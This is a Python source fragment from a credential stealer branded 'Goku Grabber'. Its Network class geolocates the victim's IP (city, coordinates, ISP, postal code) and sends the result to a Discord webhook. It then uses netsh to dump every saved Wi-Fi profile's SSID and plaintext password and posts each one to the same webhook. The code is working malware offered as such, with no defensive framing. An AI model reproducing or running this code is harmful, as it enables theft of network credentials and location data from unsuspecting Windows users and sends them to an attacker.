class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        try:
            self.city = f"``{con['city']}``"
        except:
            self.city = ":x:"
        try:
            self.region = f"``{con['region']}``"
        except:
            self.region = ":x:"
        try:
            self.country = f"``{con['country']}``"
        except:
            self.country =":x:"
        try:
            self.location = f"``{con['loc']}``"
        except:
            self.location = ":x:"
        try:
            self.ISP = f"``{con['org']}``"
        except:
            self.ISP = ":x:"
        try:
            self.postal = f"``{con['postal']}``"
        except:
            self.postal = ":x:"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
        embed.set_footer(text='Goku Grabber | by : Goku')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = DiscordWebhook(url=wbh, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
                embed.set_footer(text='Goku Grabber | by : Goku')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``")
                webhook.add_embed(embed)
                webhook.execute()
        except:pass